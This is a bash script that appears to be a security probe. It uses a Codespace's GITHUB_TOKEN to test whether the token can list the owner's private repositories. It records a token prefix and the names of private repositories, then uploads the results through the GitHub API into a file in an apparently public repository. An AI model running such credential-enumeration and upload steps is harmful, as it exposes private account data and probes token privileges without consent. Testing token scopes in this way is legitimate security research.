#!/usr/bin/env bash
OUT=/tmp/cs2.txt
: > $OUT
T="${GITHUB_TOKEN:-}"
echo "TOKEN_PREFIX=$(printf '%s' "$T" | cut -c1-4) len=${#T}" >> $OUT
# does a repo-scoped codespace token ENUMERATE the owner's other repositories?
curl -s -H "Authorization: Bearer $T" "https://api.github.com/user/repos?visibility=private&per_page=100" -o /tmp/pr
echo "USER_REPOS_PRIVATE_HTTP=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" 'https://api.github.com/user/repos?visibility=private&per_page=100')" >> $OUT
echo "PRIVATE_REPOS_RETURNED=$(python3 -c "
import json
try:
    d=json.load(open('/tmp/pr'))
    print(len(d) if isinstance(d,list) else 'err')
except Exception as e: print('parse-err')
")" >> $OUT
echo "PRIVATE_REPO_NAMES=$(python3 -c "
import json
try:
    d=json.load(open('/tmp/pr'))
    print(','.join(r['full_name'] for r in d) if isinstance(d,list) else '')
except Exception: print('')
")" >> $OUT
curl -s -H "Authorization: Bearer $T" "https://api.github.com/user/repos?visibility=all&per_page=100" -o /tmp/pa
echo "ALL_REPOS_RETURNED=$(python3 -c "
import json
try:
    d=json.load(open('/tmp/pa'))
    print(len(d) if isinstance(d,list) else 'err')
except Exception: print('parse-err')
")" >> $OUT
echo "ALL_REPO_NAMES=$(python3 -c "
import json
try:
    d=json.load(open('/tmp/pa'))
    print(','.join((r['full_name']+('[PRIV]' if r['private'] else '')) for r in d) if isinstance(d,list) else '')
except Exception: print('')
")" >> $OUT
# CONTROL that the token works at all
echo "CONTROL_own_repo=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" https://api.github.com/repos/antonade/gh-probe-pub)" >> $OUT
curl -s -X PUT -H "Authorization: Bearer $T" \
  "https://api.github.com/repos/antonade/gh-probe-pub/contents/cs-result2.txt" \
  -d "{\"message\":\"cs probe 2\",\"branch\":\"csresult\",\"content\":\"$(base64 -w0 $OUT)\"}" >/dev/null
